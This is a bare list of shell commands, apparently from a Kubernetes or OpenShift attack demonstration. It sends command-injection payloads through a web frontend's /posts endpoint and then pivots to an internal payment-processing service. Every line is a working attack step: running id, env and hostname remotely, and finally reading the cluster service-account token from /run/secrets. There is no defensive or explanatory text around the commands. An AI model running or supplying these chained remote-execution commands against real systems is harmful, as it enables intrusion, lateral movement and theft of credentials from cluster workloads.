


curl -X POST -d "cmd=curl -X POST -d 'cmd=cat /etc/hostname' http://visa-processor-service.payments:8080/posts" http://asset-cache-frontend.apps.ocp.ralvares.com/posts


Using alpine as base image - no curl but wget

#ID from asset-cache
wget -q -O - --post-data 'cmd=id' http://asset-cache-frontend.apps.ocp.ralvares.com/posts

#env
wget -q -O - --post-data 'cmd=wget -q -O - --post-data "cmd=env" http://visa-processor-service.payments:8080/posts' http://asset-cache-frontend.apps.ocp.ralvares.com/posts

#hostname
wget -q -O - --post-data 'cmd=wget -q -O - --post-data "cmd=cat /etc/hostname" http://visa-processor-service.payments:8080/posts' http://asset-cache-frontend.apps.ocp.ralvares.com/posts

#cat token
wget -q -O - --post-data 'cmd=wget -q -O - --post-data "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token" http://visa-processor-service.payments:8080/posts' http://asset-cache-frontend.apps.ocp.ralvares.com/posts